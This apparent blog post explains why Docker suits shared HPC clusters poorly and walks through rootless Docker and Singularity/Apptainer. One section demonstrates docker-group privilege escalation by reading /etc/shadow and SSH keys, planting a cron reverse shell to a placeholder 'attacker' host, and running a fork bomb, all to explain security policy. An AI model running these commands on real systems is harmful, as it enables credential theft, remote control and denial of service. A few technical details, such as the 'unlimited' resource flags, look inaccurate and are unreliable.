---
slug: containers-hpc-docker-singularity-apptainer
title: "Containers on HPC: From Docker to Singularity and Apptainer"
authors: [river]
tags: [hpc, docker, containers, singularity, apptainer]
image: ./imgs/intro.png
---

Container technologies have revolutionized software deployment and reproducibility in scientific computing. However, traditional Docker faces significant limitations in High-Performance Computing (HPC) environments. This post explores why Docker struggles on HPC systems and introduces modern alternatives like Docker rootless, Singularity, and Apptainer.

<!-- truncate -->

## The Docker Problem on HPC Systems

### Why Docker Doesn't Work for Normal Users

Docker is powerful, but it comes with a critical security model that makes it problematic for shared HPC systems:

**Docker requires root privileges** to run containers. This is because Docker's daemon operates at the system level and needs elevated permissions to:
- Create network namespaces
- Mount filesystems
- Manage storage drivers
- Access hardware resources

On HPC systems with many users sharing resources, giving Docker access to all users would be a security nightmare. A user with Docker access could:
- Escalate privileges to root
- Access other users' data through container mounts
- Consume unlimited system resources
- Bypass resource quotas and scheduling policies

### Real Example: Docker Privilege Escalation

Here's a concrete demonstration of how a regular user can escalate to root privileges using Docker:

```bash
# A normal user with docker group membership
whoami
# Output: regularuser

# User runs a container and mounts the entire root filesystem
docker run -v /:/host -it ubuntu:latest bash

# Inside the container, the user can access ALL system files as root
root@container# cat /host/etc/shadow
# This reveals root password hashes that should be inaccessible!

root@container# cat /host/root/.ssh/id_rsa
# Can steal other users' SSH keys

root@container# whoami
# Output: root (inside the container)

# User can write files as root
root@container# echo "malicious content" > /host/etc/cron.d/backdoor
root@container# echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" > /host/etc/cron.d/reverse_shell
```

**What just happened?**
- A regular user (regularuser) gained root-level access
- The user accessed and modified system files (e.g., `/etc/shadow`, cron jobs)
- The user could install backdoors, steal credentials, and compromise the entire system
- This escalation is NOT prevented by Docker—it's built into Docker's design

```bash
# Another dangerous example: Escape the resource limits
# User runs container with no resource restrictions
docker run -it --memory=unlimited --cpus=unlimited ubuntu:latest

# Inside container, user runs a fork bomb
:(){ :|:& };:

# This crashes the entire HPC node, affecting ALL other users
```

**Why is this a problem?**
- Docker's daemon runs as root
- Any user in the docker group can communicate with the daemon
- The daemon will mount/execute anything the user requests
- There's no way to prevent privilege escalation once docker group access is granted

```bash
# Standard Docker setup (unsafe on shared systems)
sudo usermod -aG docker regularuser

# Now regularuser can:
docker run -v /:/host ...     # Access ANY file on the system
docker run --privileged ...   # Run as root
docker pull malicious:latest  # Download backdoored containers
```

This is why **system administrators NEVER grant docker group access on shared HPC systems**.

```bash
# Typical Docker setup requires sudo
sudo docker run -it ubuntu:latest bash

# Even with docker group membership, this is a privilege escalation vector
docker run -it ubuntu:latest bash
```

### The Governance Challenge

HPC clusters are carefully managed environments with:
- Strict security policies
- Resource allocation via job schedulers (Slurm, PBS)
- Multi-tenant workloads requiring isolation
- Audit trails for compliance

Docker's monolithic daemon architecture conflicts with these requirements. System administrators rightfully restrict Docker to prevent security breaches and resource conflicts.

## Solution 1: Docker Rootless Mode

### What is Docker Rootless?

Docker rootless allows Docker to run without root privileges, addressing one layer of the privilege escalation problem. It uses user namespaces to isolate the daemon and containers.

### How to Use Docker Rootless

**Installation:**
```bash
# Install rootless Docker
curl https://get.docker.com/rootless | sh

# Verify installation
dockerd-rootless-setuptool.sh install

# Start the daemon
systemctl --user start docker
```

**Using rootless Docker:**
```bash
# No sudo needed!
docker run -it ubuntu:latest bash

# Check the user
docker run whoami
# Output: root (but it's a mapped non-root user)
```

### Advantages

- ✅ No root daemon required
- ✅ Better isolation than standard Docker
- ✅ Improved security posture
- ✅ Familiar Docker experience for users

### Limitations for HPC

- ⚠️ Still uses Docker's storage and networking model
- ⚠️ Not optimized for cluster environments
- ⚠️ Doesn't integrate with HPC schedulers (Slurm)
- ⚠️ Limited resource control mechanisms
- ⚠️ Performance overhead in some scenarios

Docker rootless is a step forward but doesn't solve the fundamental mismatch between Docker's design and HPC requirements.

## Solution 2: Singularity (Now Apptainer)

### The HPC-Native Container Solution

Singularity was purpose-built for HPC environments. It addresses the fundamental security and scheduling problems Docker has on clusters. In 2021, it was open-sourced as **Apptainer** by the Linux Foundation.

### Why Singularity/Apptainer Excels on HPC

**User-focused design:**
```bash
# Run as normal user, no daemon required
singularity run mycontainer.sif

# Direct execution without privilege escalation
singularity exec mycontainer.sif python script.py
```

**Container is a single file:**
```bash
# Portable and easy to manage
ls -lh mycontainer.sif
# Output: -rw-r--r--  1 user group 2.5G Feb 11 10:00 mycontainer.sif

# Copy between systems
cp mycontainer.sif /cluster/home/user/
```

**Preserves user identity and permissions:**
```bash
# Inside container, you're still yourself
singularity exec mycontainer.sif id
# Output: uid=1001(user) gid=1002(group)...

# Access your files as expected
singularity exec mycontainer.sif ls -la ~
```

### Installing Singularity/Apptainer with Pixi (Recommended)

Since Singularity/Apptainer are commonly used across HPC systems and bioinformatics workflows, the modern approach is to install them globally using **Pixi**, which is much simpler and more reliable than traditional package managers.

**Step 1: Install Pixi (if not already installed):**
```bash
# One-time setup
curl -fsSL https://pixi.sh/install.sh | bash

# Add pixi to your PATH to use in current shell, or open new shell to reload
export PATH="$HOME/.pixi/bin:$PATH"

# Verify pixi installation
pixi --version
```

**Step 2: Install Apptainer globally:**
```bash
# Simple one-liner - that's it!
pixi global install apptainer

# Verify installation
apptainer --version
```

**Step 3 (Optional): Install other common bioinformatics tools globally:**
```bash
# Install multiple tools at once
pixi global install apptainer -c conda-forge --expose apptainer

# All tools are now available system-wide
apptainer --version
```

**Benefits of this approach:**
- ✅ **Simple**: Just `pixi global install apptainer`
- ✅ **No sudo required**: Installs in user space
- ✅ **Works everywhere**: Linux, macOS, HPC clusters
- ✅ **Modern dependencies**: Always gets recent versions from conda-forge
- ✅ **Reproducible**: Lock files track exact versions if needed
- ✅ **Easy updates**: `pixi global upgrade apptainer`

**Verify the Installation:**
```bash
# Check version
apptainer --version

# Run a test container from Docker Hub
apptainer run docker://ubuntu:22.04 echo "Apptainer works"

# List available sub-commands
apptainer --help
```

Once installed globally via Pixi, Apptainer is available to all projects and users without needing to activate environments for each session.

### Building Singularity/Apptainer Containers

You can build from Docker images or write native definition files:

**Method 1: Convert Docker image**
```bash
# Build directly from Docker Hub
apptainer build ubuntu.sif docker://ubuntu:22.04

# Build from existing Docker image
apptainer build myapp.sif docker://myregistry.com/myapp:latest
```

**Method 2: Write a definition file**

Create `myapp.def`:
```singularity
Bootstrap: docker
From: ubuntu:22.04

%post
    apt-get update
    apt-get install -y python3 pip
    pip install numpy scipy

%environment
    export PATH=/usr/local/bin:$PATH

%runscript
    exec python3 "$@"

%help
    This container runs Python analysis scripts
```

Build it:
```bash
# Note: first build may require sudo, but running requires no special privileges
apptainer build myapp.sif myapp.def

# Run without any special privileges
apptainer run myapp.sif script.py
```

### Integrating with HPC Job Schedulers

**With Slurm:**
```bash
#!/bin/bash
#SBATCH --job-name=analysis
#SBATCH --ntasks=4
#SBATCH --mem=16GB
#SBATCH --time=01:00:00

# Run container through scheduler
apptainer run myapp.sif python /data/analysis.py
```

**With PBS:**
```bash
#!/bin/bash
#PBS -N analysis
#PBS -l select=1:ncpus=4:mem=16gb
#PBS -l walltime=01:00:00

cd $PBS_O_WORKDIR
apptainer run myapp.sif python /data/analysis.py
```

Singularity doesn't interfere with scheduler resource allocation—it uses standard system calls.

### Key Singularity/Apptainer Features

| Feature                   | Singularity/Apptainer | Docker    | Docker Rootless |
| ------------------------- | --------------------- | --------- | --------------- |
| No daemon required        | ✅ Yes                 | ❌ No      | ❌ No            |
| Single file format        | ✅ Yes                 | ❌ No      | ❌ No            |
| User identity preserved   | ✅ Yes                 | ❌ No      | ⚠️ Partial       |
| HPC scheduler integration | ✅ Yes                 | ❌ No      | ❌ No            |
| Permission isolation      | ✅ Yes                 | ⚠️ Limited | ⚠️ Limited       |
| Resource control          | ✅ Via cgroups         | ✅ Native  | ⚠️ Limited       |
| Learning curve            | ⚠️ Moderate            | ✅ Low     | ✅ Low           |

## Practical Comparison: Running a Bioinformatics Pipeline

### With Docker (Not Recommended on HPC)
```bash
# Requires privileged setup
sudo docker run -v /data:/data myapp:latest \
  bwa mem reference.fa reads.fastq > output.sam
```

### With Docker Rootless (Better, Still Limited)
```bash
# No sudo, but still not HPC-optimized
docker run -v /data:/data myapp:latest \
  bwa mem reference.fa reads.fastq > output.sam
```

### With Singularity/Apptainer (HPC-Ready)
```bash
# Simple, no special privileges, works with Slurm
singularity exec myapp.sif \
  bwa mem reference.fa reads.fastq > output.sam

# Or in a Slurm script
sbatch -N 1 --ntasks=8 --mem=32G myjob.sh
# (inside myjob.sh runs singularity as normal)
```

## Migration Path: From Docker to Apptainer

### Step 1: Identify Your Docker Images

```bash
# List your images
docker images
```

### Step 2: Build Apptainer Containers

```bash
# Convert existing Docker images
apptainer build myapp.sif docker://myregistry/myapp:latest

# Or build from Docker Compose
# First, build your Docker image
docker build -t myapp:latest .

# Then convert
apptainer build myapp.sif docker-daemon://myapp:latest
```

### Step 3: Test Locally

```bash
# Run and verify
apptainer run myapp.sif command
apptainer exec myapp.sif python script.py
```

### Step 4: Deploy on HPC

```bash
# Copy to cluster
scp myapp.sif user@hpc-cluster:/home/user/

# Use in job scripts
sbatch my_job.sh
```

## Best Practices for HPC Containers

1. **Minimize image size** - Large containers slow down transfer and startup
2. **Use caching layers efficiently** - Order Dockerfile commands from least to most frequently changed
3. **Bind mount data** - Keep data outside containers, use volume mounts
4. **Preserve user context** - Avoid setting specific UIDs in production containers
5. **Test locally first** - Verify on your machine before cluster deployment
6. **Version your containers** - Use tags, keep definition files in version control
7. **Document dependencies** - Include build instructions and software versions

## When to Use What

| Scenario                 | Recommendation                           |
| ------------------------ | ---------------------------------------- |
| Local development        | Docker or Docker Desktop                 |
| Single-user HPC access   | Singularity/Apptainer                    |
| Multi-tenant HPC cluster | Singularity/Apptainer (mandatory)        |
| Rootless requirement     | Docker rootless or Singularity/Apptainer |
| Kubernetes clusters      | Docker or similar (not HPC-focused)      |
| Maximum compatibility    | Singularity/Apptainer (works everywhere) |

## Conclusion

Docker is an excellent tool for development and modern cloud infrastructure, but HPC environments require a different approach. Docker rootless improves Docker's security model but doesn't fundamentally address HPC integration.

**Singularity/Apptainer is the clear choice for HPC** because it:
- Runs without a daemon or root privileges
- Preserves user identity and permissions
- Integrates seamlessly with job schedulers
- Uses portable single-file containers
- Was designed specifically for scientific computing clusters

If you're working on HPC systems, adopt Singularity/Apptainer. If you're developing locally, use Docker—then convert to Singularity when deploying to the cluster. This hybrid approach gives you the best of both worlds: Docker's familiarity for development and Singularity's robustness for production HPC workloads.

### Further Reading

- [Apptainer Documentation](https://apptainer.org/docs/)
- [Singularity Documentation](https://singularity-ce.readthedocs.io/)
- [Docker Rootless Mode](https://docs.docker.com/engine/security/rootless/)
- [Converting Docker Images to Singularity](https://apptainer.org/docs/user/main/docker_and_oci.html)
